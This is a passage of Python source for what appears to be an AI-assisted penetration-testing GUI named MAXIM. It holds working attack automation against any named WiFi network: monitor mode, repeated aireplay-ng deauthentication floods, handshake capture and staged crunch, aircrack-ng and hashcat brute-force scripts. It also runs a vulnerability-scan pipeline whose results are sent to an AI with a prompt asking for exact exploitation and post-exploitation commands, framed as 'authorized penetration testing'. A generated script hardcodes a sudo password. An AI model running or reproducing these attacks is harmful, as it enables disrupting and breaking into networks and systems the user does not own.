            monitor_iface = ifaces[0]
            keep_iface = ifaces[1] if len(ifaces) > 1 else None

        return monitor_iface, keep_iface

    def _is_wifi_command(self, cmd):
        """Check if command involves WiFi tools that need monitor mode."""
        parts = re.split(r'[;&|]+', cmd)
        for part in parts:
            words = part.strip().split()
            if not words:
                continue
            tool = words[0]
            if tool == "sudo" and len(words) > 1:
                tool = words[1]
            if tool in self.WIFI_TOOLS:
                return True
        return False

    def _detect_monitor_name(self, iface):
        """After airmon-ng start, the monitor interface is either
        the same name (wlan1) or with 'mon' appended (wlan1mon).
        Check which one actually exists."""
        try:
            # Check if wlan1mon exists
            code, out, _ = self.runner.run(f"ip link show {iface}mon 2>/dev/null")
            if code == 0 and f"{iface}mon" in out:
                return f"{iface}mon"
        except Exception:
            pass
        # Default: adapter keeps its name in monitor mode
        return iface

    def _replace_wifi_iface(self, cmd, iface, mon_name):
        """Replace wlan0/wlan0mon in command with the selected interfaces."""
        # Replace wlan0mon with the monitor interface (could be wlan1 or wlan1mon)
        cmd = cmd.replace("wlan0mon", mon_name)
        # Replace remaining wlan0 references with monitor interface too
        # (for tools that use the base name, e.g. airmon-ng start wlan0)
        cmd = re.sub(r'\bwlan0\b', mon_name, cmd)
        return cmd

    def _start_monitor_mode(self, iface, keep_iface):
        """Start monitor mode on selected adapter using iw (safe — never kills NetworkManager).
        wlan0 stays untouched. Returns the monitor interface name."""
        self.terminal.appendPlainText(f"\n[WiFi] Starting monitor mode on {iface}...\n")
        if keep_iface:
            self.terminal.appendPlainText(f"[WiFi] {keep_iface} will NOT be touched.\n")

        # Use ip/iw to put adapter in monitor mode — does NOT kill NetworkManager
        self.runner.run(f"sudo ip link set {iface} down")
        self.runner.run(f"sudo iw dev {iface} set type monitor")
        code, out, _ = self.runner.run(f"sudo ip link set {iface} up")

        # Verify monitor mode
        code, out, _ = self.runner.run(f"sudo iw dev {iface} info")
        if "monitor" in out.lower():
            self.terminal.appendPlainText(f"[WiFi] {iface} is now in monitor mode.\n")
            mon_name = iface
        else:
            # Fallback: try airmon-ng (without check kill)
            self.terminal.appendPlainText(f"[WiFi] iw failed, trying airmon-ng...\n")
            code, out, _ = self.runner.run(f"sudo airmon-ng start {iface}")
            if out.strip():
                self.terminal.appendPlainText(out)
            mon_name = self._detect_monitor_name(iface)

        self.terminal.appendPlainText(f"[WiFi] Monitor interface: {mon_name}\n\n")
        return mon_name

    def _restore_network(self):
        """Restore wlan1 from monitor mode back to managed. Never touches wlan0."""
        mon = getattr(self, '_monitor_iface_name', None)
        self._wifi_adapter_selected = False
        self._monitor_iface_name = None
        # Restore wlan1 to managed mode using iw (safe — doesn't affect wlan0)
        restore_iface = mon or "wlan1"
        self._execute_command(
            f"sudo ip link set {restore_iface} down 2>/dev/null; "
            f"sudo iw dev {restore_iface} set type managed 2>/dev/null; "
            f"sudo ip link set {restore_iface} up 2>/dev/null; "
            f"echo '[OK] {restore_iface} restored to managed mode'"
        )

    # ═══════════════════════════════════════
    #  VULNERABILITY SCAN PIPELINE
    # ═══════════════════════════════════════

    def _full_vuln_scan(self, target):
        """Run comprehensive vulnerability scan: nmap + nikto + gobuster + whatweb + searchsploit → AI analysis."""
        import tempfile

        target = _sanitize_shell_arg(target)
        if not target:
            self.terminal.appendPlainText("\n[!] Invalid target — contains unsafe characters.\n")
            return

        report_dir = "/tmp/maxim_vulnscan"
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', target)
        report_file = f"{report_dir}/{safe_target}_{ts}.txt"

        self.terminal.appendPlainText(f"\n{'═'*60}")
        self.terminal.appendPlainText(f"  FULL VULNERABILITY SCAN — {target}")
        self.terminal.appendPlainText(f"{'═'*60}")
        self.terminal.appendPlainText(f"  Tools: nmap, nikto, gobuster, whatweb, searchsploit")
        self.terminal.appendPlainText(f"  Report: {report_file}")
        self.terminal.appendPlainText(f"{'═'*60}\n")

        script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_vulnscan_')
        script.write("#!/bin/bash\n\n")
        script.write(f"mkdir -p '{report_dir}'\n")
        script.write(f"REPORT='{report_file}'\n")
        script.write(f"TARGET='{target}'\n\n")

        script.write("echo '════════════════════════════════════════════════════' | tee -a \"$REPORT\"\n")
        script.write("echo '  MAXIM VULNERABILITY SCAN REPORT' | tee -a \"$REPORT\"\n")
        script.write(f"echo '  Target: {target}' | tee -a \"$REPORT\"\n")
        script.write(f"echo '  Date: $(date)' | tee -a \"$REPORT\"\n")
        script.write("echo '════════════════════════════════════════════════════' | tee -a \"$REPORT\"\n\n")

        # Stage 1: Nmap service/version/OS detection
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [1/7] NMAP — Service & Version Detection' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write(f"sudo nmap -sV -sC -O -T4 --open -oN '{report_dir}/nmap_services.txt' \"$TARGET\" 2>&1 | tee -a \"$REPORT\"\n\n")

        # Stage 2: Nmap vulnerability scripts
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [2/7] NMAP — Vulnerability Scripts' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write(f"sudo nmap --script vuln -T4 \"$TARGET\" 2>&1 | tee -a \"$REPORT\"\n\n")

        # Stage 3: Whatweb (tech fingerprinting)
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [3/7] WHATWEB — Technology Fingerprinting' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write(f"whatweb -a 3 \"$TARGET\" 2>&1 | tee -a \"$REPORT\" || echo '  [!] whatweb not available' | tee -a \"$REPORT\"\n\n")

        # Stage 4: Nikto (web vulnerability scanner)
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [4/7] NIKTO — Web Vulnerability Scanner' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write(f"nikto -h \"$TARGET\" -C all -maxtime 300 2>&1 | tee -a \"$REPORT\" || echo '  [!] nikto not available' | tee -a \"$REPORT\"\n\n")

        # Stage 5: Gobuster (directory enumeration)
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [5/7] GOBUSTER — Directory Enumeration' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("WORDLIST='/usr/share/wordlists/dirb/common.txt'\n")
        script.write("if [ ! -f \"$WORDLIST\" ]; then WORDLIST='/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt'; fi\n")
        script.write(f"gobuster dir -u \"http://$TARGET\" -w \"$WORDLIST\" -t 50 -q --timeout 10s 2>&1 | head -100 | tee -a \"$REPORT\" || echo '  [!] gobuster not available' | tee -a \"$REPORT\"\n\n")

        # Stage 6: Searchsploit (exploit lookup from nmap results)
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [6/7] SEARCHSPLOIT — Known Exploits Lookup' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write(f"if [ -f '{report_dir}/nmap_services.txt' ]; then\n")
        script.write(f"  searchsploit --nmap '{report_dir}/nmap_services.txt' 2>&1 | tee -a \"$REPORT\" || echo '  [!] searchsploit not available' | tee -a \"$REPORT\"\n")
        script.write("else\n")
        script.write("  echo '  [!] No nmap output to search' | tee -a \"$REPORT\"\n")
        script.write("fi\n\n")

        # Stage 7: SSL/TLS check
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write("echo '  [7/7] SSL/TLS — Certificate & Cipher Check' | tee -a \"$REPORT\"\n")
        script.write("echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' | tee -a \"$REPORT\"\n")
        script.write(f"sslscan \"$TARGET\" 2>&1 | tee -a \"$REPORT\" || echo '  [!] sslscan not available' | tee -a \"$REPORT\"\n\n")

        # Final summary
        script.write("echo '' | tee -a \"$REPORT\"\n")
        script.write("echo '════════════════════════════════════════════════════' | tee -a \"$REPORT\"\n")
        script.write("echo '  SCAN COMPLETE' | tee -a \"$REPORT\"\n")
        script.write(f"echo '  Full report saved: {report_file}' | tee -a \"$REPORT\"\n")
        script.write("echo '════════════════════════════════════════════════════' | tee -a \"$REPORT\"\n")

        script.close()
        os.chmod(script.name, 0o755)

        # Store report path for AI analysis after scan completes
        self._vulnscan_report = report_file
        self._vulnscan_target = target
        self._vulnscan_script = script.name

        self._execute_command(f"bash '{script.name}'")

    _HS_SIGNAL_FILE = "/tmp/maxim_hs_done"

    def _capture_handshake(self, essid):
        """Handshake capture: scan+capture in external terminal, cracking in internal output.
        Uses wlan1 (external) for monitor mode. wlan0 NEVER touched."""
        import tempfile

        iface = "wlan1"
        out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
        safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
        essid_dir = f"{out_dir}/{safe_essid}"
        capture_prefix = f"{essid_dir}/{safe_essid}"
        scan_file = "/tmp/maxim_hscan"
        signal_file = self._HS_SIGNAL_FILE

        self.terminal.appendPlainText(f"\n{'═'*60}")
        self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
        self.terminal.appendPlainText(f"  Adapter: {iface}  (wlan0 untouched)")
        self.terminal.appendPlainText(f"  Output:  {essid_dir}/")
        self.terminal.appendPlainText(f"{'═'*60}")
        self.terminal.appendPlainText(f"  Scan + capture → external terminal")
        self.terminal.appendPlainText(f"  Cracking → this output window\n")

        # Reset guard flag
        self._hs_processing = False

        # Clean signal file
        try:
            os.remove(signal_file)
        except FileNotFoundError:
            pass

        # ── Use nmcli to find BSSID+channel (works regardless of interface state) ──
        script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
        script.write("#!/bin/bash\n")
        script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
        script.write(f"mkdir -p '{essid_dir}'\n")
        script.write(f"rm -f '{signal_file}'\n\n")

        # Make sure NetworkManager is running and interface is managed
        script.write(f"echo '[*] Preparing to scan...'\n")
        script.write("sudo systemctl start NetworkManager 2>/dev/null\n")
        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
        script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
        script.write("sleep 2\n\n")

        # nmcli dev wifi list outputs:
        #   IN-USE  BSSID              SSID        MODE   CHAN  ...
        #           AA:BB:CC:DD:EE:FF  MAX         Infra  6     ...
        # Use --rescan yes to force fresh scan
        # Use -t (terse) for machine-readable colon-separated output
        # -f BSSID,SSID,CHAN for just the fields we need
        script.write("BSSID=''\nCHANNEL=''\n")
        script.write(f"echo '[*] Scanning for {essid}...'\n")
        script.write("for i in 1 2 3 4 5 6 7 8 9 10; do\n")
        script.write(f"  echo \"  Attempt $i/10\"\n")
        # -t = terse (colon-separated), -f = fields, --rescan yes = fresh scan
        script.write(f"  LINE=$(nmcli -t -f BSSID,SSID,CHAN dev wifi list ifname {iface} --rescan yes 2>/dev/null | grep -i ':{essid}:' | head -1)\n")
        # If exact match fails, try partial match
        script.write("  if [ -z \"$LINE\" ]; then\n")
        script.write(f"    LINE=$(nmcli -t -f BSSID,SSID,CHAN dev wifi list ifname {iface} 2>/dev/null | grep -i '{essid}' | head -1)\n")
        script.write("  fi\n")
        script.write("  if [ -n \"$LINE\" ]; then\n")
        # terse format: AA\\:BB\\:CC\\:DD\\:EE\\:FF:SSID:CHAN
        # BSSID colons are escaped as \\: in terse mode, SSID and CHAN separated by unescaped :
        # Extract BSSID (first 17 chars after unescaping) and CHAN (last field)
        script.write("    BSSID=$(echo \"$LINE\" | sed 's/\\\\\\:/:/g' | cut -c1-17)\n")
        script.write("    CHANNEL=$(echo \"$LINE\" | rev | cut -d: -f1 | rev)\n")
        script.write("    if [ -n \"$BSSID\" ] && [ -n \"$CHANNEL\" ]; then\n")
        script.write("      echo \"  FOUND: BSSID=$BSSID  Channel=$CHANNEL\"\n")
        script.write("      break\n")
        script.write("    fi\n")
        script.write("  fi\n")
        script.write("  sleep 3\n")
        script.write("done\n\n")

        # Debug: if not found, show what nmcli sees so user can tell us
        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
        script.write(f"  echo '[!] Could not find {essid}'\n")
        script.write("  echo ''\n")
        script.write("  echo 'Networks visible:'\n")
        script.write(f"  nmcli -f BSSID,SSID,CHAN dev wifi list ifname {iface} 2>/dev/null\n")
        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")

        # Kill NetworkManager so it doesn't interfere with monitor mode
        script.write("sudo airmon-ng check kill 2>/dev/null\n\n")

        # Switch to monitor mode
        script.write(f"echo '[*] Switching to monitor mode...'\n")
        script.write(f"sudo ip link set {iface} down\n")
        script.write(f"sudo iw dev {iface} set type monitor\n")
        script.write(f"sudo ip link set {iface} up\n")
        script.write(f"MON={iface}\n\n")

        # Targeted capture + deauth
        script.write("echo\n")
        script.write("echo '══════════════════════════════════════════════════════════'\n")
        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
        script.write("echo '  MAXIM will auto-detect and start cracking.'\n")
        script.write("echo '══════════════════════════════════════════════════════════'\n")
        script.write("echo\n\n")

        # Deauth in background
        script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
        script.write("    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1\n")
        script.write("    sleep 4\n  done\n) &\n\n")

        # Capture in foreground
        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")

        script.close()
        os.chmod(script.name, 0o755)

        # Open external terminal — GUI stays responsive
        self.runner.run_in_terminal(f"bash '{script.name}'")

        # Poll for a .cap file that contains a VALID handshake
        # (airodump creates .cap immediately, but handshake comes later)
        self._hs_essid_dir = essid_dir
        self._hs_poll_timer = QTimer()
        self._hs_poll_timer.timeout.connect(self._check_handshake_done)
        self._hs_poll_timer.start(5000)  # Check every 5 seconds

    def _cap_has_handshake(self, cap_file):
        """Check if a .cap file contains a valid WPA handshake using aircrack-ng."""
        try:
            result = subprocess.run(
                f"aircrack-ng '{cap_file}' 2>&1",
                shell=True, capture_output=True, text=True, timeout=10
            )
            # aircrack-ng shows "1 handshake" when valid; reject "0 handshake"
            return bool(re.search(r'[1-9]\d* handshake', result.stdout))
        except Exception:
            return False

    def _check_handshake_done(self):
        """Poll .cap files for valid handshake, then kill terminal and crack."""
        import glob
        # Guard: prevent double-fire while processing
        if getattr(self, '_hs_processing', False):
            return
        essid_dir = getattr(self, '_hs_essid_dir', None)
        if not essid_dir:
            self._hs_poll_timer.stop()
            return

        # Check signal file for FAILED (network not found during scan)
        signal_file = self._HS_SIGNAL_FILE
        if os.path.exists(signal_file):
            try:
                with open(signal_file, 'r') as f:
                    content = f.read().strip()
                os.remove(signal_file)
            except Exception:
                content = ""
            if content in ("FAILED", "NO_CAP"):
                self._hs_poll_timer.stop()
                self._hs_essid_dir = None
                self._hs_processing = False
                self.terminal.appendPlainText(f"\n[!] Capture failed.\n")
                return

        # Check .cap files for valid handshake (aircrack-ng test)
        cap_files = sorted(glob.glob(f"{essid_dir}/*.cap"), key=os.path.getmtime, reverse=True)
        cap_file = None
        for cf in cap_files:
            if self._cap_has_handshake(cf):
                cap_file = cf
                break

        if not cap_file:
            return  # No valid handshake yet — keep polling

        # Valid handshake found — stop polling, kill external terminal, crack internally
        self._hs_processing = True
        self._hs_poll_timer.stop()
        self._hs_essid_dir = None

        # Kill the external capture terminal and all its children
        term_proc = getattr(self.runner, '_terminal_proc', None)
        if term_proc:
            try:
                pgid = os.getpgid(term_proc.pid)
                os.killpg(pgid, signal.SIGTERM)
            except Exception:
                try:
                    term_proc.terminate()
                except Exception:
                    pass
            self.runner._terminal_proc = None

        self.terminal.appendPlainText(f"\n{'═'*60}")
        self.terminal.appendPlainText(f"  HANDSHAKE CAPTURED — CRACKING NOW")
        self.terminal.appendPlainText(f"  File: {cap_file}")
        self.terminal.appendPlainText(f"{'═'*60}\n")
        self._hs_processing = False
        self._analyze_file(cap_file)

    # ═══════════════════════════════════════
    #  COMMAND EXECUTION
    # ═══════════════════════════════════════

    SUDO_TOOLS = {
        "nmap", "masscan", "netdiscover", "airmon-ng", "airodump-ng",
        "aireplay-ng", "aircrack-ng", "wifite", "reaver", "bettercap",
        "ettercap", "tcpdump", "macchanger", "responder", "arp-scan",
        "hping3",
    }

    def _execute_command(self, cmd, as_root=False):
        # WiFi adapter selection — ask which adapter for monitor mode
        if self._is_wifi_command(cmd):
            if not getattr(self, '_wifi_adapter_selected', False):
                iface, keep = self._select_wifi_adapter()
                if iface is None:
                    self.terminal.appendPlainText("\n[!] WiFi operation cancelled.\n")
                    return
                self._selected_wifi_iface = iface
                self._keep_wifi_iface = keep
                self._wifi_adapter_selected = True

                # Start monitor mode and detect actual mon interface name
                mon_name = self._start_monitor_mode(iface, keep)
                self._monitor_iface_name = mon_name

            mon_name = getattr(self, '_monitor_iface_name', f"{self._selected_wifi_iface}mon")
            # Replace interface names in command
            cmd = self._replace_wifi_iface(cmd, self._selected_wifi_iface, mon_name)
            # Remove airmon-ng check kill / airmon-ng start from command — already done
            cmd = re.sub(r'sudo\s+airmon-ng\s+check\s+kill\s*[;&|]*\s*', '', cmd)
            cmd = re.sub(r'sudo\s+airmon-ng\s+start\s+\S+\s*[;&|]*\s*', '', cmd)
            cmd = cmd.strip().strip(';&|').strip()
        # Auto-add sudo
        if not cmd.strip().startswith("sudo ") and not cmd.strip().startswith("echo "):
            first_word = cmd.strip().split()[0] if cmd.strip() else ""
            if first_word in self.SUDO_TOOLS or as_root:
                cmd = f"sudo {cmd}"

        # Ghost Mode — wrap through proxychains if applicable
        if self._should_proxy(cmd):
            cmd = self._wrap_proxychains(cmd)

        # Reset brute force state for new crack commands
        is_crack = any(t in cmd for t in ["john ", "hashcat ", "aircrack-ng "])
        if is_crack and not getattr(self, '_is_bruteforcing', False):
            self._is_bruteforcing = False

        self._set_running(True, f"Running: {cmd[:60]}...")

        self.terminal.appendPlainText(f"\n{'─'*60}")
        self.terminal.appendPlainText(f" [{datetime.now().strftime('%H:%M:%S')}]  $ {cmd}")
        self.terminal.appendPlainText(f"{'─'*60}\n")
        scrollbar = self.terminal.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

        self.statusBar().showMessage(f"Running: {cmd[:80]}...")

        self.current_thread = OutputSignal(self.runner, cmd, as_root)
        self.current_thread.line_received.connect(self._on_output_line)
        self.current_thread.finished.connect(
            lambda code, dur: self._on_command_done(cmd, code, dur)
        )
        self.current_thread.start()

    # Patterns that indicate a progress/status line (should overwrite previous)
    _PROGRESS_RE = re.compile(
        r'(?:Speed[.#]|Progress[.=]|Recovered[.]|Status[.]|Session[.]|'
        r'Guess\.|Time\.|ETA[.:]|Hash\.|candidates|'  # hashcat status lines
        r'guesses:\s*\d|Testing:|p/s$|c/s$|C/s$|g/s$|'  # john progress
        r'\d+[kKmMgG]?/s\b|'  # any speed indicator
        r'^\s*\d+\.\d+%)'  # percentage
    )

    def _on_output_line(self, line):
        is_progress = bool(self._PROGRESS_RE.search(line))

        if is_progress and getattr(self, '_last_was_progress', False):
            # Overwrite the last line (simulate \r behavior)
            cursor = self.terminal.textCursor()
            cursor.movePosition(QTextCursor.End)
            cursor.movePosition(QTextCursor.StartOfBlock, QTextCursor.KeepAnchor)
            cursor.removeSelectedText()
            cursor.insertText(line.rstrip('\n'))
        else:
            self.terminal.moveCursor(QTextCursor.End)
            self.terminal.insertPlainText(line)

        self._last_was_progress = is_progress
        scrollbar = self.terminal.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def _on_command_done(self, cmd, exit_code, duration):
        status = "OK" if exit_code == 0 else f"FAILED (exit {exit_code})"
        self.terminal.appendPlainText(f"\n[{status}] {duration:.1f}s\n")
        self._set_running(False)
        self.statusBar().showMessage(f"{status} -- {duration:.1f}s")
        scrollbar = self.terminal.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

        tool_name = cmd.split()[0].split("/")[-1] if cmd else "unknown"
        self.session.log_command(cmd, tool_name, exit_code, duration)
        self.cmd_count_label.setText(f"{len(self.session.commands)} commands")

        # If cracking finished with no password found, offer brute force
        is_crack_cmd = any(t in cmd for t in ["john ", "hashcat ", "aircrack-ng ", "maxim_crack_"])
        if is_crack_cmd and not getattr(self, '_is_bruteforcing', False):
            # Check if password was actually cracked in the output
            text = self.terminal.toPlainText()[-2000:]
            found = (
                re.search(r'KEY FOUND!\s*\[', text) or                    # aircrack
                re.search(r'PASSWORD FOUND', text) or                      # our scripts
                re.search(r'PASSWORD CRACKED', text) or                    # our scripts
                re.search(r'[1-9]\d* password hash(?:es)? cracked', text) or  # john (exclude "0 password")
                re.search(r'Recovered\.+:\s*[1-9]', text) or              # hashcat
                re.search(r'Status\.+:\s*Cracked', text) or               # hashcat
                re.search(r'^\?:.+', text, re.MULTILINE)                   # john --show
            )
            if not found:
                self._offer_brute_force(cmd)

        # If vuln scan finished, trigger AI analysis of report
        if "maxim_vulnscan_" in cmd and hasattr(self, '_vulnscan_report'):
            self._analyze_vulnscan_report()

    def _analyze_vulnscan_report(self):
        """Read the vuln scan report and ask AI to provide exploitation steps."""
        report_path = getattr(self, '_vulnscan_report', None)
        target = getattr(self, '_vulnscan_target', 'unknown')
        if not report_path:
            return

        # Clean up state
        del self._vulnscan_report
        del self._vulnscan_target

        self.terminal.appendPlainText(f"\n{'═'*60}")
        self.terminal.appendPlainText("  AI ANALYZING SCAN RESULTS...")
        self.terminal.appendPlainText(f"{'═'*60}\n")
        QApplication.processEvents()

        # Read the report file
        try:
            code, report_content, _ = self.runner.run(f"cat {shlex.quote(report_path)} 2>/dev/null")
            if not report_content or len(report_content.strip()) < 50:
                self.terminal.appendPlainText("[!] Report is empty or too short for analysis.\n")
                return
        except Exception:
            self.terminal.appendPlainText("[!] Could not read scan report.\n")
            return

        # Truncate if too long for AI context
        if len(report_content) > 12000:
            report_content = report_content[:12000] + "\n\n[... truncated for AI analysis ...]"

        if self.ai and self.ai.is_available():
            prompt = (
                f"I just ran a full vulnerability scan on target: {target}\n\n"
                f"Here are the complete scan results:\n\n{report_content}\n\n"
                f"Based on these results, provide:\n"
                f"1. CRITICAL FINDINGS — list every vulnerability found, rated by severity (Critical/High/Medium/Low)\n"
                f"2. OPEN PORTS & SERVICES — summary with version info\n"
                f"3. EXPLOITATION STEPS — for each vulnerability found, give exact commands and steps to exploit it\n"
                f"4. RECOMMENDED TOOLS — specific Metasploit modules, exploit-db references, or manual exploitation commands\n"
                f"5. POST-EXPLOITATION — what to do after gaining access\n\n"
                f"Be specific with exact commands. This is for authorized penetration testing."
            )
            self._ai_execute(prompt)
        else:
            self.terminal.appendPlainText(
                "[!] AI not configured — cannot analyze results automatically.\n"
                "    Set up AI: AI menu > Set API Key\n"
                f"    Raw report saved at: {report_path}\n"
            )

    def _offer_brute_force(self, original_cmd):
        """No password found — offer brute force. Detects tool type and uses fastest method."""
        import tempfile

        # Extract the file path from the original command
        m = re.search(r"'([^']+)'", original_cmd)
        if not m:
            m = re.search(r'\s(\S+\.\S+)', original_cmd)
        if not m:
            self.terminal.appendPlainText("[!] Could not determine file to brute force\n")
            return
        filepath = m.group(1)

        # Detect what type of crack this is
        is_aircrack = "aircrack-ng" in original_cmd
        is_hashcat = "hashcat" in original_cmd
        is_john = "john" in original_cmd and not is_aircrack

        # Detect formats from original command
        john_fmt_match = re.search(r'--format=(\S+)', original_cmd)
        john_fmt = john_fmt_match.group(1) if john_fmt_match else None
        hashcat_mode_match = re.search(r'-m\s+(\d+)', original_cmd)
        hashcat_mode = hashcat_mode_match.group(1) if hashcat_mode_match else None

        # WiFi .cap files — use aircrack-ng brute force via crunch pipe
        if is_aircrack:
            reply = QMessageBox.question(self, "No Password Found",
                "Wordlists didn't crack the WiFi handshake.\n\n"
                "Do you want to BRUTE FORCE it?\n\n"
                "Stage 1: 8-digit numbers (00000000-99999999) — common WiFi passwords\n"
                "Stage 2: 8-char lowercase (aaaaaaaa-zzzzzzzz)\n"
                "Stage 3: 9-10 digit numbers\n"
                "Stage 4: 8-char alphanumeric\n\n"
                "WPA passwords are 8-63 characters.\n"
                "Stops early if password is found.",
                QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
            if reply != QMessageBox.Yes:
                return

            self._is_bruteforcing = True
            self.terminal.appendPlainText("\n\n  BRUTE FORCING WPA HANDSHAKE...\n\n")

            script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_brute_')
            script.write("#!/bin/bash\n\n")

            # Each stage: crunch generates passwords, pipes to aircrack
            stages = [
                ("Stage 1: 8-digit numbers (most common WiFi passwords)",
                 f"crunch 8 8 0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
                ("Stage 2: 8-char lowercase letters",
                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng -w - -b auto '{filepath}'"),
                ("Stage 3: 9-digit numbers",
                 f"crunch 9 9 0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
                ("Stage 4: 10-digit numbers (phone numbers)",
                 f"crunch 10 10 0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
                ("Stage 5: 8-char alphanumeric",
                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
            ]

            for label, stage_cmd in stages:
                script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
                script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
                script.write(f"OUTPUT=$({stage_cmd} 2>&1)\n")
                script.write(f"echo \"$OUTPUT\"\n")
                script.write(f"if echo \"$OUTPUT\" | grep -q 'KEY FOUND!'; then\n  echo ''\n  echo '  KEY FOUND! Check output above.'\n  exit 0\nfi\n")

            script.write(f"\necho ''\necho '  Brute force complete — no password found in tested ranges.'\n")
            script.close()
            os.chmod(script.name, 0o755)
            self._execute_command(f"bash '{script.name}'")
            return

        # Hashcat brute force — FASTEST (GPU-accelerated mask attack)
        if is_hashcat and hashcat_mode:
            reply = QMessageBox.question(self, "No Password Found",
                "Wordlists didn't crack it.\n\n"
                "Do you want to BRUTE FORCE with hashcat (GPU)?\n\n"
                "Stage 1: Digits 1-12 chars (?d) — very fast\n"
                "Stage 2: Lowercase 1-8 chars (?l) — fast\n"
                "Stage 3: Lowercase + digits 1-7 chars — medium\n"
                "Stage 4: All printable 1-6 chars (?a) — slower\n"
                "Stage 5: Common patterns (word+digits, etc.)\n\n"
                "Uses GPU — much faster than CPU.\n"
                "Stops early if password is found.",
                QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
            if reply != QMessageBox.Yes:
                return

            self._is_bruteforcing = True
            self.terminal.appendPlainText("\n\n  HASHCAT GPU BRUTE FORCE...\n\n")
            hm = hashcat_mode
            check = f"hashcat -m {hm} '{filepath}' --show 2>/dev/null | grep -v '^Hashfile' | grep -v 'Token length' | grep -v '^[*]' | grep -v '^$' | grep ':'"

            script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_brute_')
            script.write("#!/bin/bash\n\n")

            # Hashcat mask attack stages — ?d=digit ?l=lower ?u=upper ?a=all printable
            stages = [
                # Digits — extremely fast
                ("Stage 1: Digits 1-4 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?d?d?d?d' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 2>/dev/null"),
                ("Stage 1b: Digits 5-8 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?d?d?d?d?d?d?d?d' --increment --increment-min=5 --force -O -w 3 --status --status-timer=3 2>/dev/null"),
